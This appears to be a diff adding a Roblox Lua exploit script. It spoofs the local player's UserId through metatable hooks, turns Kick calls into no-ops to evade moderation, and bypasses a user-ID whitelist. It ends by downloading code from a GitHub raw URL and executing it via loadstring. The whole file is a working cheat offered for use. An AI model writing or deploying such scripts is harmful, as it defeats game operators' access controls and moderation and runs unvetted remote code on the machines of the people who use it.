@@ -1,0 +1,51 @@
+local spoofedUserId = 3905185006
+local Players = game:GetService("Players")
+local lp = Players.LocalPlayer
+local whitelistedUserId = lp.UserId
+local mt = getrawmetatable(game)
+setreadonly(mt, false)
+local oldIndex = mt.__index
+mt.__index = newcclosure(function(t, k)
+    if t == lp and k == "UserId" then
+        return spoofedUserId
+    end
+    return oldIndex(t, k)
+end)
+setreadonly(mt, true)
+local playerMT = getrawmetatable(lp)
+setreadonly(playerMT, false)
+local oldIndex3 = playerMT.__index
+local oldNamecall = playerMT.__namecall
+playerMT.__index = newcclosure(function(t, k)
+    if k == "Kick" then
+        return function() end
+    end
+    return oldIndex3(t, k)
+end)
+playerMT.__namecall = newcclosure(function(self, ...)
+    local method = getnamecallmethod()
+    if method == "Kick" then
+        return
+    end
+    return oldNamecall(self, ...)
+end)
+setreadonly(playerMT, true)
+local function bypassPlayerIdCheck()
+    local validUserIds = {
+        7847999917, 4305349227, 1168915031, 1430398669, 8288752473,
+        3024726810, 1308962230, 7424122259, 1275974745, 8269437870,
+        3905185006, 7152568259, 1334186114
+    }
+    table.insert(validUserIds, spoofedUserId)
+    table.find(validUserIds, lp.UserId)
+end
+bypassPlayerIdCheck()
+local function safeLoadString(url)
+    local success, result = pcall(function()
+        loadstring(game:HttpGet(url))()
+    end)
+    if not success then
+        warn("Error loading script: " .. result)
+    end
+end
+safeLoadString("https://raw.githubusercontent.com/Gorkaelpro59/h3ll-paid-V2/refs/heads/main/README.md")
